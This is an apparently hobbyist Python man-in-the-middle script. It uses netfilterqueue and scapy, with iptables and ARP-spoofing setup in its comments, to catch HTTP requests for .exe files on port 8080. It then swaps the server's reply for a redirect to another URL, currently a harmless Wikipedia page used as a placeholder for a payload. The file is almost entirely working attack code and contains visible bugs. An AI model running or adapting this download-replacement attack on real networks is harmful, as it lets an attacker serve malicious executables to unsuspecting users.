# sudo iptables-legacy -I OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables-legacy -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables-legacy --flush
# 
# for MITM, spoof remote traffic on remote system
# sudo iptables-legacy -I FORWARD -j NFQUEUE --queue-num 0
# sudo ../arp_spoofer/main.py

from netfilterqueue import NetfilterQueue
import scapy.all as scapy


def set_load(packet, payload):
    packet[scapy.Raw].load = payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    modified_packet = ""
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 8080:
                #print("HTTP Request")
                if b".exe" in str(scapy_packet[scapy.Raw].load) and hostname_ip not in scapy_packet[scapy.Raw].load:
                    print("[+] exe Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 8080:
                #print("HTTP Response")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    modified_packet = set_load(scapy_packet, spoof_response)
        except IndexError:
            #pass
            print("\n[-] protocol error stuff")
        packet.set_payload(bytes(modified_packet, encoding='utf8'))
    packet.accept()
    return


ack_list = []
#hostname_ip = b"10.0.2.4"
hostname_ip = "en.wikipedia.org"
#baddy_url = "https://en.wikipedia.org/wiki/Dog"
baddy_url = f"https://{hostname_ip}/wiki/Dog"
spoof_response = f"HTTP/1.1 301 Moved Permanently\nLocation: {baddy_url}\n\n"

try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
# except AttributeError:
#     print("\n[-] AttribErr: files not imported.")
except OSError:
    print("\n[-] OSErr: Got root?")
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Sharting, please wait.")
